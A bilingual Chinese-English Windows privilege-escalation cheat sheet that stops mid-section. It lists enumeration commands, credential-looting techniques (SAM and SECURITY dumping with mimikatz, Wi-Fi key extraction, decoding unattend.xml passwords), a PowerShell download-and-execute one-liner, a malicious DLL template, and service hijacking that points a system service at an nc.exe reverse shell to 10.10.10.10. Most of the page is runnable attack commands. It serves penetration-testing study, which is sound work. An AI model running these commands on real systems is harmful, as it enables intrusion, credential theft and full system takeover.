# Windows - 权限提升 (Privilege Escalation)

## 摘要 (Summary)

* [工具 (Tools)](#tools)
* [Windows 版本和配置 (Windows Version and Configuration)](#windows-version-and-configuration)
* [用户枚举 (User Enumeration)](#user-enumeration)
* [网络枚举 (Network Enumeration)](#network-enumeration)
* [杀毒软件枚举 (Antivirus Enumeration)](#antivirus-enumeration)
* [默认可写文件夹 (Default Writable Folders)](#default-writable-folders)
* [权限提升 - 搜索密码 (EoP - Looting for passwords)](#eop---looting-for-passwords)
    * [SAM 和 SYSTEM 文件 (SAM and SYSTEM files)](#sam-and-system-files)
    * [HiveNightmare](#hivenightmare)
    * [LAPS 设置 (LAPS Settings)](#laps-settings)
    * [搜索文件内容 (Search for file contents)](#search-for-file-contents)
    * [搜索具有特定名称的文件 (Search for a file with a certain filename)](#search-for-a-file-with-a-certain-filename)
    * [在注册表中搜索键名和密码 (Search the registry for key names and passwords)](#search-the-registry-for-key-names-and-passwords)
    * [unattend.xml 中的密码 (Passwords in unattend.xml)](#passwords-in-unattendxml)
    * [Wifi 密码 (Wifi passwords)](#wifi-passwords)
    * [便签密码 (Sticky Notes passwords)](#sticky-notes-passwords)
    * [存储在服务中的密码 (Passwords stored in services)](#passwords-stored-in-services)
    * [凭据管理器中存储的密码 (Passwords stored in Key Manager)](#passwords-stored-in-key-manager)
    * [Powershell 历史记录 (Powershell History)](#powershell-history)
    * [Powershell 转录 (Powershell Transcript)](#powershell-transcript)
    * [备用数据流中的密码 (Password in Alternate Data Stream)](#password-in-alternate-data-stream)
* [权限提升 - 进程枚举和任务 (EoP - Processes Enumeration and Tasks)](#eop---processes-enumeration-and-tasks)
* [权限提升 - 服务权限不正确 (EoP - Incorrect permissions in services)](#eop---incorrect-permissions-in-services)
* [权限提升 - 适用于 Linux 的 Windows 子系统（WSL）(EoP - Windows Subsystem for Linux (WSL))](#eop---windows-subsystem-for-linux-wsl)
* [权限提升 - 未引用的服务路径 (EoP - Unquoted Service Paths)](#eop---unquoted-service-paths)
* [权限提升 - $PATH 拦截 (EoP - $PATH Interception)](#eop---path-interception)
* [权限提升 - 命名管道 (EoP - Named Pipes)](#eop---named-pipes)
* [权限提升 - 内核漏洞利用 (EoP - Kernel Exploitation)](#eop---kernel-exploitation)
* [权限提升 - Microsoft Windows 安装程序 (EoP - Microsoft Windows Installer)](#eop---microsoft-windows-installer)
    * [AlwaysInstallElevated](#alwaysinstallelevated)
    * [CustomActions](#customactions)
* [权限提升 - 不安全的 GUI 应用 (EoP - Insecure GUI apps)](#eop---insecure-gui-apps)
* [权限提升 - 评估易受攻击的驱动程序 (EoP - Evaluating Vulnerable Drivers)](#eop---evaluating-vulnerable-drivers)
* [权限提升 - 打印机 (EoP - Printers)](#eop---printers)
    * [通用打印机 (Universal Printer)](#universal-printer)
    * [自带漏洞 (Bring Your Own Vulnerability)](#bring-your-own-vulnerability)
* [权限提升 - Runas](#eop---runas)
* [权限提升 - 滥用卷影副本 (EoP - Abusing Shadow Copies)](#eop---abusing-shadow-copies)
* [权限提升 - 从本地管理员到 NT SYSTEM (EoP - From local administrator to NT SYSTEM)](#eop---from-local-administrator-to-nt-system)
* [权限提升 - 离地攻击二进制文件和脚本 (EoP - Living Off The Land Binaries and Scripts)](#eop---living-off-the-land-binaries-and-scripts)
* [权限提升 - 模拟提权 (EoP - Impersonation Privileges)](#eop---impersonation-privileges)
    * [恢复服务帐户权限 (Restore A Service Account's Privileges)](#restore-a-service-accounts-privileges)
    * [Meterpreter getsystem 及其替代方案 (Meterpreter getsystem and alternatives)](#meterpreter-getsystem-and-alternatives)
    * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
    * [Juicy Potato (Abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
    * [Rogue Potato (Fake OXID Resolver)](#rogue-potato-fake-oxid-resolver)
    * [EFSPotato (MS-EFSR EfsRpcOpenFileRaw)](#efspotato-ms-efsr-efsrpcopenfileraw)
    * [PrintSpoofer (Printer Bug)](#printspoofer-printer-bug)
* [权限提升 - 特权文件写入 (EoP - Privileged File Write)](#eop---privileged-file-write)
    * [DiagHub](#diaghub)
    * [UsoDLLLoader](#usodllloader)
    * [WerTrigger](#wertrigger)
    * [WerMgr](#wermgr)
* [权限提升 - 特权文件删除 (EoP - Privileged File Delete)](#eop---privileged-file-delete)
* [权限提升 - 常见漏洞和利用 (EoP - Common Vulnerabilities and Exposures)](#eop---common-vulnerabilities-and-exposure)
    * [MS08-067 (NetAPI)](#ms08-067-netapi)
    * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt200020032008xpvista7)
    * [MS11-080 (adf.sys)](#ms11-080-afdsys---microsoft-windows-xp2003)
    * [MS15-051 (Client Copy Image)](#ms15-051-client-copy-image---microsoft-windows-20032008782012)
    * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
    * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
    * [CVE-2019-1388](#cve-2019-1388)
* [权限提升 - $PATH 拦截 (EoP - $PATH Interception)](#eop---path-interception)
* [参考资料 (References)](#references)

## 工具 (Tools)

* [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)

    ```powershell
    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
    ```

* [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
* [(被弃用) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)

    ```powershell
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
    ```

* [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
* [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

    ```powershell
    ./windows-exploit-suggester.py --update
    ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
    ```

* [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
* [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
* [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
* [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)

    ```powershell
    Seatbelt.exe -group=all -full
    Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
    Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
    ```

* [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
* [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)

    ```powershell
    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    ```

* [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
* [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)

    ```powershell
    # 首先获取系统信息 (First obtain systeminfo)
    systeminfo
    systeminfo > systeminfo.txt
    # 然后将文件交给 wesng 分析 (Then feed it to wesng)
    python3 wes.py --update-wes
    python3 wes.py --update
    python3 wes.py systeminfo.txt
    ```

* [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)

    ```powershell
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML"
    ```

## Windows 版本和配置 (Windows Version and Configuration)

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

提取补丁和更新列表内容 (Extract patchs and updates)

```powershell
wmic qfe
```

架构 (Architecture)

```powershell
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

列出所有环境变量 (List all env variables)

```powershell
set
Get-ChildItem Env: | ft Key,Value
```

列出所有驱动器 (List all drives)

```powershell
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## 用户枚举 (User Enumeration)

获取当前用户名 (Get current username)

```powershell
echo %USERNAME% || whoami
$env:username
```

列出用户的权限 (List user privilege)

```powershell
whoami /priv
whoami /groups
```

列出所有的用户 (List all users)

```powershell
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

列出登录要求；可用于暴力破解 (List logon requirements; useable for bruteforcing)

```powershell
$env:usernadsc
net accounts
```

获取关于用户的详细信息（如管理员、行政人员、当前用户） (Get details about a user (i.e. administrator, admin, current user))

```powershell
net user administrator
net user admin
net user %USERNAME%
```

列出所有本地组 (List all local groups)

```powershell
net localgroup
Get-LocalGroup | ft Name
```

获取关于组的详细信息（如管理员组） (Get details about a group (i.e. administrators))

```powershell
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
```

获取域控制器 (Get Domain Controllers)

```powershell
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
```

## 网络枚举 (Network Enumeration)

列出所有网络接口、IP 和 DNS。 (List all network interfaces, IP, and DNS.)

```powershell
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

列出当前路由表 (List current routing table)

```powershell
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

列出 ARP 表 (List the ARP table)

```powershell
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

列出当前所有的网络连接 (List all current connections)

```powershell
netstat -ano
```

列出所有的网络共享项 (List all network shares)

```powershell
net share
powershell Find-DomainShare -ComputerDomain domain.local
```

SNMP 配置 (SNMP Configuration)

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

## 杀毒软件枚举 (Antivirus Enumeration)

在机器上使用 `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName` 指令来枚举杀毒软件。(Enumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`)

## 默认可写文件夹 (Default Writable Folders)

```powershell
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp
```

## 权限提升 - 搜索密码 (EoP - Looting for passwords)

### SAM 和 SYSTEM 文件 (SAM and SYSTEM files)

安全账户管理器 (SAM)，通常被称为 Security Accounts Manager，是一个数据库文件。用户密码以散列格式存储在注册表配置单元中，可作为 LM 散列或 NTLM 散列。该文件可以在 `%SystemRoot%/system32/config/SAM` 中找到并且被挂载在 `HKLM/SAM`。 (The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.)

```powershell
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

使用 `pwdump` 或 `samdump2` 为 John 密码破解工具生成一个具有 Hash 格式内容的文件。 (Generate a hash file for John using `pwdump` or `samdump2`.)

```powershell
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
```

要么使用 `john -format=NT /root/sam.txt` 的命令对其进行破解，或使用 [hashcat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md#hashcat) 或者可以使用哈希传递技巧。(Either crack it with `john -format=NT /root/sam.txt`, [hashcat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md#hashcat) or use Pass-The-Hash.)

### HiveNightmare

> CVE-2021–36934 允许你在 Windows 10 和 11 中作为非管理员用户检索所有注册表配置单元（SAM、SECURITY、SYSTEM） (CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user)

使用 `icacls` 检查漏洞 (Check for the vulnerability using `icacls`)

```powershell
C:\Windows\System32> icacls config\SAM
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access! (这是错误的 - 普通用户不应该具有读取权限！)
```

然后通过在文件系统上请求影子副本并从中读取配置单元来利用 CVE。(Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.)

```powershell
mimikatz> token::whoami /full

# 列出可用的卷影副本 (List shadow copies available)
mimikatz> misc::shadowcopies

# 从 SAM 数据库中提取帐户 (Extract account from SAM databases)
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

# 从 SECURITY 中提取秘密 (Extract secrets from SECURITY)
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```

### LAPS 设置 (LAPS Settings)

从 Windows 注册表中提取 `HKLM\Software\Policies\Microsoft Services\AdmPwd`。 (Extract `HKLM\Software\Policies\Microsoft Services\AdmPwd` from Windows Registry.)

* 已启用 LAPS (LAPS Enabled): AdmPwdEnabled
* LAPS 管理员帐户名 (LAPS Admin Account Name): AdminAccountName
* LAPS 密码复杂性 (LAPS Password Complexity): PasswordComplexity
* LAPS 密码长度 (LAPS Password Length): PasswordLength
* 已启用 LAPS 过期保护 (LAPS Expiration Protection Enabled): PwdExpirationProtectionEnabled

### 搜索文件内容 (Search for file contents)

```powershell
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
findstr /spin "password" *.*
```

同时在远程位置（如 SMB 共享和 SharePoint）搜索: (Also search in remote places such as SMB Shares and SharePoint:)

* 搜索 SharePoint 中的密码: (Search passwords in SharePoint:) [nheiniger/SnaffPoint](https://github.com/nheiniger/SnaffPoint) (必须先编译，参考问题参见: (must be compiled first, for referencing issue see:) [Pull #6](https://github.com/nheiniger/SnaffPoint/pull/6))

```powershell
# 第一步，获取一个 token (First, retrieve a token)
## 方法 1：使用 SnaffPoint 二进制文件 (Method 1: using SnaffPoint binary)
$token = (.\GetBearerToken.exe https://your.sharepoint.com)
## 方法 2：使用 AADInternals (Method 2: using AADInternals)
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals
$token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com")

# 第二步，在 Sharepoint 上搜索 (Second, search on Sharepoint)
## 方法 1：在 ./presets 目录中使用搜索字符串 (Method 1: using search strings in ./presets dir)
.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token
## 方法 2：在命令行中使用搜索字符串 (Method 2: using search string in command line)
### -l 参数使用 FQL 搜索，见： (-l uses FQL search, see:) https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference
.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config"
```

* 搜索 SMB 共享中的密码: (Search passwords in SMB Shares:) [SnaffCon/Snaffler](https://github.com/SnaffCon/Snaffler)

### 搜索具有特定名称的文件 (Search for a file with a certain filename)

```powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

### 在注册表中搜索键名和密码 (Search the registry for key names and passwords)

```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows 自动登录 (Windows Autologin)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP 参数 (SNMP parameters)
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty 明文代理凭据 (Putty clear text proxy credentials)
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC 凭据 (VNC credentials)
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### unattend.xml 中的密码 (Passwords in unattend.xml)

`unattend.xml` 文件的位置。 (Location of the unattend.xml files.)

```powershell
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

使用具有静默错误输出的方式以及指定的扩展名在系统中匹配和查询 `dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul` 命令。 (Display the content of these files with `dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul`.)

内容示例 (Example content)

```powershell
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

无应答凭据内容往往会被按照 base64 格式保存进行编码处理操作，手动反解码就能得出明文内容。(Unattend credentials are stored in base64 and can be decoded manually with base64.)

```powershell
$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
SecretSecurePassword1234*
```

在 Metasploit 工具的模块当中，存在一个被称为 `post/windows/gather/enum_unattend` 的扫描检索的模块工具。(The Metasploit module `post/windows/gather/enum_unattend` looks for these files.)

### IIS Web config

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

### 其他文件 (Other files)

```bat
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
```

### Wifi 密码 (Wifi passwords)

查找 AP SSID (Find AP SSID)

```bat
netsh wlan show profile
```

获取明文密码 (Get Cleartext Pass)

```bat
netsh wlan show profile <SSID> key=clear
```

从所有接入点中获取 wifi 密码提取的一行命令的方法脚本。(Oneliner method to extract wifi passwords from all the access point.)

```batch
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
### 便签密码 (Sticky Notes passwords)

便签应用程序将其内容存储在位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` 的 sqlite 数据库中。 (The sticky notes app stores it's content in a sqlite db located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`)

### 存储在服务中的密码 (Passwords stored in services)

使用 [SessionGopher](https://github.com/Arvanaghi/SessionGopher) 获取 PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP 的保存会话信息。 (Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher))

```powershell
https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

### 凭据管理器中存储的密码 (Passwords stored in Key Manager)

:warning: 此软件将在 GUI 中显示其输出 (This software will display its output in a GUI)

```ps1
rundll32 keymgr,KRShowKeyMgr
```

### Powershell 历史记录 (Powershell History)

禁用 Powershell 历史记录 (Disable Powershell history)：`Set-PSReadlineOption -HistorySaveStyle SaveNothing`。

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Powershell 转录 (Powershell Transcript)

```xml
C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
```

### 备用数据流中的密码 (Password in Alternate Data Stream)

```ps1
PS > Get-Item -path flag.txt -Stream *
PS > Get-Content -path flag.txt -Stream Flag
```

## 权限提升 - 进程枚举和任务 (EoP - Processes Enumeration and Tasks)

* 正在运行哪些进程？ (What processes are running?)

    ```powershell
    tasklist /v
    net start
    sc query
    Get-Service
    Get-Process
    Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
    ```

* 哪些进程以 "system" 身份运行？ (Which processes are running as "system")

    ```powershell
    tasklist /v /fi "username eq system"
    ```

* 你有 powershell 魔法吗？ (Do you have powershell magic?)

    ```powershell
    REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
    ```

* 列出已安装的程序 (List installed programs)

    ```powershell
    Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
    ```

* 列出服务 (List services)

    ```powershell
    net start
    wmic service list brief
    tasklist /SVC
    ```

* 枚举计划任务 (Enumerate scheduled tasks)

    ```powershell
    schtasks /query /fo LIST 2>nul | findstr TaskName
    schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
    Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
    ```

* 启动任务 (Startup tasks)

    ```powershell
    wmic startup get caption,command
    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
    dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
    ```

## 权限提升 - 服务权限不正确 (EoP - Incorrect permissions in services)

> 具有不正确文件权限并作为 Administrator/SYSTEM 运行的服务可能会允许提权。 你可以替换其二进制文件、重启服务，从而获得 system 权限。(A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.)

通常，服务指向可写的位置：(Often, services are pointing to writable locations:)

* 孤立安装残缺项，由于并未将其移除在启动项内也可能还会留下存在的服务路径 (Orphaned installs, not installed anymore but still exist in startup)
* DLL 劫持 (DLL Hijacking)

    ```powershell
    # 查找缺失的 DLL  (find missing DLL )
    - Find-PathDLLHijack PowerUp.ps1
    - Process Monitor : 检查 "Name Not Found" 的事件 (check for "Name Not Found")

    # 编译恶意 DLL (compile a malicious dll)
    - 64 位编译命令 (For x64 compile with): "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
    - 32 位编译命令 (For x86 compile with): "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"

    # windows_dll.c 的内容 (content of windows_dll.c)
    #include <windows.h>
    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
        if (dwReason == DLL_PROCESS_ATTACH) {
            system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
            ExitProcess(0);
        }
        return TRUE;
    }
    ```

* 权限较弱的 PATH 目录 (PATH directories with weak permissions)

    ```powershell
    $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
    $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

    $ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
    FOR /F %i in (Servicenames.txt) DO echo %i
    type Servicenames.txt
    FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
    ```

或者，你可以使用 Metasploit 的利用模块：`exploit/windows/local/service_permissions` (Alternatively you can use the Metasploit exploit : `exploit/windows/local/service_permissions`)

请注意检查文件权限命令 `cacls` 和 `icacls` (Note to check file permissions you can use `cacls` and `icacls`)
> icacls (Windows Vista +)
> cacls (Windows XP)

你正在寻找输出中的 `BUILTIN\Users:(F)`（完全访问）、`BUILTIN\Users:(M)`（修改访问）或 `BUILTIN\Users:(W)`（只写访问）。(You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify access) or  `BUILTIN\Users:(W)`(Write-only access) in the output.)

### Windows 10 的例子 - CVE-2019-1322 UsoSvc (Example with Windows 10 - CVE-2019-1322 UsoSvc)

先决条件：服务帐户权限 (Prerequisite: Service account)

```powershell
PS C:\Windows\system32> sc.exe stop UsoSvc
PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe qc usosvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: usosvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

PS C:\Windows\system32> sc.exe start UsoSvc
```

### Windows XP SP1 的示例 - upnphost (Example with Windows XP SP1 - upnphost)

```powershell
# 注意：要想利用此漏洞，必须留有空格！ (NOTE: spaces are mandatory for this exploit to work !)
